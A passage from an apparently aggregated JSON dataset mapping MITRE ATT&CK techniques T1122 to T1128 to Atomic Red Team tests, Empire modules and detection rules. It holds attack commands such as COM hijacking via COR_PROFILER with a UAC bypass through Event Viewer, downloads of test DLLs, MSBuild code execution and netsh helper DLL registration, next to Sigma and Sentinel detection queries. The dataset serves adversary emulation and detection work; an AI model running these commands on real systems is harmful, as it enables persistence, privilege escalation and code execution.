"unmanaged profiler DLL", "type": "Path", "default": "PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll"}, "clsid_guid": {"description": "custom clsid guid", "type": "String", "default": "{09108e71-974c-4010-89cb-acf471ae9e2c}"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "#{file_name} must be present\n", "prereq_command": "if (Test-Path #{file_name}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1122/bin/T1122x64.dll\" -OutFile \"#{file_name}\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\#{clsid_guid}\" -ForegroundColor Cyan\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\\InprocServer32\" -Value #{file_name} -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"#{clsid_guid}\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value #{file_name} -Force | Out-Null\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\nSTART MMC.EXE EVENTVWR.MSC\n", "cleanup_command": "Write-Host \"Removing registry keys\" -ForegroundColor Cyan\nRemove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\" -Recurse -Force\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -Force | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -Force | Out-Null\n"}}, {"name": "COM Hijack Leveraging System Scope COR_PROFILER", "description": "Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect. The unmanaged profiler DLL (`atomicNotepad.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity. \n", "supported_platforms": ["windows"], "input_arguments": {"file_name": {"description": "unmanaged profiler DLL", "type": "Path", "default": "PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll"}, "clsid_guid": {"description": "custom clsid guid", "type": "String", "default": "{09108e71-974c-4010-89cb-acf471ae9e2c}"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "#{file_name} must be present\n", "prereq_command": "if (Test-Path #{file_name}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1122/bin/T1122x64.dll\" -OutFile \"#{file_name}\"\n"}], "executor": {"name": "powershell", "elevation_required": true, "command": "Write-Host \"Creating system environment variables\" -ForegroundColor Cyan\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"#{clsid_guid}\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value #{file_name} -Force | Out-Null\n", "cleanup_command": "Write-Host \"Removing system environment variables\" -ForegroundColor Cyan\nRemove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -Force | Out-Null\nRemove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -Force | Out-Null\nRemove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -Force | Out-Null\n"}}, {"name": "COM Hijack Leveraging registry-free process scope COR_PROFILER", "description": "Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`atomicNotepad.dll`) executes when the CLR is loaded by PowerShell.\n", "supported_platforms": ["windows"], "input_arguments": {"file_name": {"description": "unamanged profiler DLL", "type": "Path", "default": "PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll"}, "clsid_guid": {"description": "custom clsid guid", "type": "String", "default": "{09108e71-974c-4010-89cb-acf471ae9e2c}"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "#{file_name} must be present\n", "prereq_command": "if (Test-Path #{file_name}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1122/bin/T1122x64.dll\" -OutFile \"#{file_name}\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "$env:COR_ENABLE_PROFILING = 1\n$env:COR_PROFILER = '#{clsid_guid}'\n$env:COR_PROFILER_PATH = '#{file_name}'\nPOWERSHELL -c 'Start-Sleep 1'\n", "cleanup_command": "$env:COR_ENABLE_PROFILING = 0\n$env:COR_PROFILER = ''\n$env:COR_PROFILER_PATH = ''\n"}}]}}, {"SysmonHunter - T1122": {"name": "Component Object Model Hijacking", "description": null, "level": "medium", "phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "\\\\Software\\\\Classes\\\\CLSID\\\\.+\\\\InprocServer32", "flag": "regex"}}}, {"type": "process", "process": {"cmdline": {"pattern": "\\\\Software\\\\Classes\\\\CLSID\\\\.+\\\\InprocServer32", "flag": "regex"}}}]}}], "command_list": ["Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\#{clsid_guid}\" -ForegroundColor Cyan\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\\InprocServer32\" -Value PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"#{clsid_guid}\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll -Force | Out-Null\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\nSTART MMC.EXE EVENTVWR.MSC\n", "Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -ForegroundColor Cyan\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32\" -Value #{file_name} -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value #{file_name} -Force | Out-Null\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\nSTART MMC.EXE EVENTVWR.MSC\n", "Write-Host \"Creating system environment variables\" -ForegroundColor Cyan\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"#{clsid_guid}\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll -Force | Out-Null\n", "Write-Host \"Creating system environment variables\" -ForegroundColor Cyan\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value #{file_name} -Force | Out-Null\n", "$env:COR_ENABLE_PROFILING = 1\n$env:COR_PROFILER = '#{clsid_guid}'\n$env:COR_PROFILER_PATH = 'PathToAtomicsFolder\\T1122\\bin\\T1122x64.dll'\nPOWERSHELL -c 'Start-Sleep 1'\n", "$env:COR_ENABLE_PROFILING = 1\n$env:COR_PROFILER = '{09108e71-974c-4010-89cb-acf471ae9e2c}'\n$env:COR_PROFILER_PATH = '#{file_name}'\nPOWERSHELL -c 'Start-Sleep 1'\n", "\\\\Software\\\\Classes\\\\CLSID\\\\.+\\\\InprocServer32", "\\\\Software\\\\Classes\\\\CLSID\\\\.+\\\\InprocServer32"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and registry_key_path contains \"\\\\Software\\\\Classes\\\\CLSID\\\\\"", "name": "Component Object Model Hijacking"}], "possible_detections": [{"data_source": {"title": "Windows Registry Persistence - COM key linking", "id": "9b0f8a61-91b2-464f-aceb-0527e0a45020", "status": "experimental", "description": "Detects COM object hijacking via TreatAs subkey", "references": ["https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/"], "author": "Kutepov Anton, oscd.community", "date": "2019/10/23", "modified": "2019/11/07", "tags": ["attack.persistence", "attack.t1122"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 12, "TargetObject|startswith": "HKU\\", "TargetObject|contains": "_Classes\\CLSID\\", "TargetObject|endswith": "\\TreatAs"}, "condition": "selection"}, "falsepositives": ["Maybe some system utilities in rare cases use linking keys for backward compability"], "level": "medium"}}]}, {"technique_id": "T1123", "commands": [{"source": "atomics/T1123/T1123.yaml", "command": "powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/osx_mic_record", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/osx_mic_record", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Audio Capture": {"attack_technique": "T1123", "display_name": "Audio Capture", "atomic_tests": [{"name": "using device audio capture commandlet", "description": "[AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet)\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet\n"}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/osx/osx_mic_record", "ATT&CK Technique #1": "T1123", "ATT&CK Technique #2": "", "Technique": "Audio Capture", "Concatenate for Python Dictionary": "\"python/collection/osx/osx_mic_record\":  [\"T1123\"],"}}], "command_list": ["powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet\n", "python/collection/osx/osx_mic_record", "python/collection/osx/osx_mic_record"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and (process_path contains \"SoundRecorder.exe\"or process_command_line contains \"*Get-AudioDevice*\"or process_command_line contains \"*WindowsAudioDevice-Powershell-Cmdlet*\")", "name": "Audio Capture"}], "possible_detections": []}, {"technique_id": "T1124", "commands": [{"source": "atomics/T1124/T1124.yaml", "command": "net time \\\\localhost\nw32tm /tz\n", "name": null}, {"source": "atomics/T1124/T1124.yaml", "command": "Get-Date\n", "name": null}, {"source": "data/abilities/discovery/fa6e8607-e0b1-425d-8924-9b894da5a002.yml", "command": {"darwin": {"sh": {"command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}}}, "linux": {"sh": {"command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}}}, "windows": {"psh": {"command": "Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}}}}, "name": "get current system time (ISO 8601)"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Windows \\ system32> net time \\\\ ICBC\nCurrent time \\\\ ICBC is 2019/11/10 20:09:50\n\nThe command completed successfully.", "name": "Dos"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nMicrosoft Windows [Version 10.0.14393]\n(C) 2016 Microsoft Corporation. all rights reserved.\n\nC: \\ Users \\ Administrator> w32tm / tz\nTime zone: Current: TIME_ZONE_ID_UNKNOWN deviating: -480 minutes (UTC = local time + Bias)\n[Standard name: \"China Standard Time\" partial amount: 0 Date :( unspecified)]\n[Daylight Saving Time Name: \"China Daylight Saving Time\" partial amount: -60 points :( date not specified)]", "name": "Dos"}], "parsed_datasets": [{"Atomic Red Team Test - System Time Discovery": {"attack_technique": "T1124", "display_name": "System Time Discovery", "atomic_tests": [{"name": "System Time Discovery", "description": "Identify the system time. Upon execution, the local computer system time and timezone will be displayed.\n", "supported_platforms": ["windows"], "input_arguments": {"computer_name": {"description": "computer name to query", "type": "string", "default": "localhost"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "net time \\\\#{computer_name}\nw32tm /tz\n"}}, {"name": "System Time Discovery - PowerShell", "description": "Identify the system time via PowerShell. Upon execution, the system time will be displayed.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "Get-Date\n"}}]}}, {"Mitre Stockpile - get current system time (ISO 8601)": {"id": "fa6e8607-e0b1-425d-8924-9b894da5a002", "name": "Get System Time", "description": "get current system time (ISO 8601)", "tactic": "discovery", "technique": {"attack_id": "T1124", "name": "System Time Discovery"}, "platforms": {"darwin": {"sh": {"command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}}}, "linux": {"sh": {"command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}}}, "windows": {"psh": {"command": "Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}}}}}}], "command_list": ["net time \\\\localhost\nw32tm /tz\n", "Get-Date\n", {"darwin": {"sh": {"command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}}}, "linux": {"sh": {"command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}}}, "windows": {"psh": {"command": "Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}}}}, "Dos\nC: \\ Windows \\ system32> net time \\\\ ICBC\nCurrent time \\\\ ICBC is 2019/11/10 20:09:50\n\nThe command completed successfully.", "Dos\nMicrosoft Windows [Version 10.0.14393]\n(C) 2016 Microsoft Corporation. all rights reserved.\n\nC: \\ Users \\ Administrator> w32tm / tz\nTime zone: Current: TIME_ZONE_ID_UNKNOWN deviating: -480 minutes (UTC = local time + Bias)\n[Standard name: \"China Standard Time\" partial amount: 0 Date :( unspecified)]\n[Daylight Saving Time Name: \"China Daylight Saving Time\" partial amount: -60 points :( date not specified)]"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and (process_path contains \"*\\\\net.exe\"and process_command_line contains \"*net* time*\")or process_path contains \"w32tm.exe\"or process_command_line contains \"*Get-Date*\"", "name": "System Time Discovery"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows system service discovery\ndescription: windows server 2016\nreferences:\ntags: T1124\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: net time * # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ net1.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: C: \\ Windows \\ system32 \\ net1 time * # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ net1.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0selection4:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ net.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0timeframe: last 1m # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "name": "Yml"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows system service discovery\ndescription: windows server 2016\nreferences:\ntags: T1124\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ w32tm.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: w32tm / tz # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ w32tm.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0timeframe: last 5s # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "name": "Yml"}], "possible_detections": []}, {"technique_id": "T1126", "commands": [{"source": "atomics/T1126/T1126.yaml", "command": "net use c: \\\\test\\share\nnet share test=\\\\test\\share /REMARK:\"test share\" /CACHE:No\n", "name": null}, {"source": "atomics/T1126/T1126.yaml", "command": "net share \\\\test\\share /delete\n", "name": null}, {"source": "atomics/T1126/T1126.yaml", "command": "Remove-SmbShare -Name \\\\test\\share\nRemove-FileShare -Name \\\\test\\share\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Remove Network Share": {"attack_technique": "T1126", "display_name": "Remove Network Share", "atomic_tests": [{"name": "Add Network Share", "description": "Add a Network Share utilizing the command_prompt\n", "supported_platforms": ["windows"], "input_arguments": {"share_name": {"description": "Share to add.", "type": "string", "default": "\\\\test\\share"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "net use c: #{share_name}\nnet share test=#{share_name} /REMARK:\"test share\" /CACHE:No\n"}}, {"name": "Remove Network Share", "description": "Removes a Network Share utilizing the command_prompt\n", "supported_platforms": ["windows"], "input_arguments": {"share_name": {"description": "Share to remove.", "type": "string", "default": "\\\\test\\share"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "net share #{share_name} /delete\n"}}, {"name": "Remove Network Share PowerShell", "description": "Removes a Network Share utilizing PowerShell\n", "supported_platforms": ["windows"], "input_arguments": {"share_name": {"description": "Share to remove.", "type": "string", "default": "\\\\test\\share"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "Remove-SmbShare -Name #{share_name}\nRemove-FileShare -Name #{share_name}\n"}}]}}], "command_list": ["net use c: \\\\test\\share\nnet share test=\\\\test\\share /REMARK:\"test share\" /CACHE:No\n", "net share \\\\test\\share /delete\n", "Remove-SmbShare -Name \\\\test\\share\nRemove-FileShare -Name \\\\test\\share\n"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_path contains \"net.exe\"and process_command_line contains \"net delete\")or process_command_line contains \"Remove-SmbShare\"or process_command_line contains \"Remove-FileShare\"", "name": "Network Share Connection Removal"}], "possible_detections": []}, {"technique_id": "T1127", "commands": [{"source": "atomics/T1127/T1127.yaml", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe PathToAtomicsFolder\\T1127\\src\\T1127.csproj\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_executemsbuild", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_executemsbuild", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/code_execution/invoke_ntsd", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/code_execution/invoke_ntsd", "name": "Empire Module Command"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Log\nEvent ID: 4688\nProcess information:\nNew Process ID: 0xa9c\nNew Process Name: C: \\ Windows \\ Microsoft.NET \\ Framework64 \\ v4.0.30319 \\ csc.exe\nToken Type lift: TokenElevationTypeDefault (1)\nCreator Process ID: 0xaa0\nProcess the command line: C: \\ Windows \\ Microsoft.NET \\ Framework64 \\ v4.0.30319 \\ csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll / target: library /out:1.exe / platform: x64 / unsafe C: \\ Users \\ Administrator \\ Desktop \\ a \\ 1.cs\n\nEvent ID: 4688\nProcess information:\nNew Process ID: 0x984\nNew Process Name: C: \\ Windows \\ Microsoft.NET \\ Framework64 \\ v4.0.30319 \\ InstallUtil.exe\nToken Type lift: TokenElevationTypeDefault (1)\nCreator Process ID: 0xaa0\nProcess the command line: C: \\ Windows \\ Microsoft.NET \\ Framework64 \\ v4.0.30319 \\ InstallUtil.exe / logfile = / LogToConsole = false / U C: \\ Users \\ Administrator \\ Desktop \\ a \\ 1.exe", "name": "Log"}], "parsed_datasets": [{"Atomic Red Team Test - Trusted Developer Utilities": {"attack_technique": "T1127", "display_name": "Trusted Developer Utilities", "atomic_tests": [{"name": "MSBuild Bypass Using Inline Tasks", "description": "Executes the code in a project file using. C# Example\n", "supported_platforms": ["windows"], "input_arguments": {"filename": {"description": "Location of the project file", "type": "Path", "default": "PathToAtomicsFolder\\T1127\\src\\T1127.csproj"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Project file must exist on disk at specified location (#{filename})\n", "prereq_command": "if (Test-Path #{filename}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127/src/T1127.csproj\" -OutFile \"#{filename}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe #{filename}\n"}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/lateral_movement/invoke_executemsbuild", "ATT&CK Technique #1": "T1127", "ATT&CK Technique #2": "", "Technique": "Trusted Developer Utilities", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/invoke_executemsbuild\":  [\"T1127\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/code_execution/invoke_ntsd", "ATT&CK Technique #1": "T1127", "ATT&CK Technique #2": "", "Technique": "Trusted Developer Utilities", "Concatenate for Python Dictionary": "\"powershell/code_execution/invoke_ntsd\":  [\"T1127\"],"}}], "command_list": ["C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe PathToAtomicsFolder\\T1127\\src\\T1127.csproj\n", "powershell/lateral_movement/invoke_executemsbuild", "powershell/lateral_movement/invoke_executemsbuild", "powershell/code_execution/invoke_ntsd", "powershell/code_execution/invoke_ntsd", "Log\nEvent ID: 4688\nProcess information:\nNew Process ID: 0xa9c\nNew Process Name: C: \\ Windows \\ Microsoft.NET \\ Framework64 \\ v4.0.30319 \\ csc.exe\nToken Type lift: TokenElevationTypeDefault (1)\nCreator Process ID: 0xaa0\nProcess the command line: C: \\ Windows \\ Microsoft.NET \\ Framework64 \\ v4.0.30319 \\ csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll / target: library /out:1.exe / platform: x64 / unsafe C: \\ Users \\ Administrator \\ Desktop \\ a \\ 1.cs\n\nEvent ID: 4688\nProcess information:\nNew Process ID: 0x984\nNew Process Name: C: \\ Windows \\ Microsoft.NET \\ Framework64 \\ v4.0.30319 \\ InstallUtil.exe\nToken Type lift: TokenElevationTypeDefault (1)\nCreator Process ID: 0xaa0\nProcess the command line: C: \\ Windows \\ Microsoft.NET \\ Framework64 \\ v4.0.30319 \\ InstallUtil.exe / logfile = / LogToConsole = false / U C: \\ Users \\ Administrator \\ Desktop \\ a \\ 1.exe"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and (process_path contains \"MSBuild.exe\"or process_path contains \"msxsl.exe\")", "name": "Trusted Developer Utilities"}], "possible_detections": [{"data_source": {"title": "Microsoft Workflow Compiler", "id": "419dbf2b-8a9b-4bea-bf99-7544b050ec8d", "status": "experimental", "description": "Detects invocation of Microsoft Workflow Compiler, which may permit the execution of arbitrary unsigned code.", "tags": ["attack.defense_evasion", "attack.execution", "attack.t1127"], "author": "Nik Seetharaman", "references": ["https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": "*\\Microsoft.Workflow.Compiler.exe"}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Legitimate MWC use (unlikely in modern enterprise environments)"], "level": "high"}}]}, {"technique_id": "T1128", "commands": [{"source": "atomics/T1128/T1128.yaml", "command": "netsh.exe add helper C:\\Path\\file.dll\n", "name": null}, {"source": "SysmonHunter - Netsh Helper DLL", "command": "\\SOFTWARE\\Microsoft\\NetSh", "name": null}, {"source": "SysmonHunter - Netsh Helper DLL", "command": "\\\\Windows\\\\.+\\\\netsh.exeadd|helper", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Netsh Helper DLL": {"attack_technique": "T1128", "display_name": "Netsh Helper DLL", "atomic_tests": [{"name": "Netsh Helper DLL Registration", "description": "Netsh interacts with other operating system components using dynamic-link library (DLL) files\n", "supported_platforms": ["windows"], 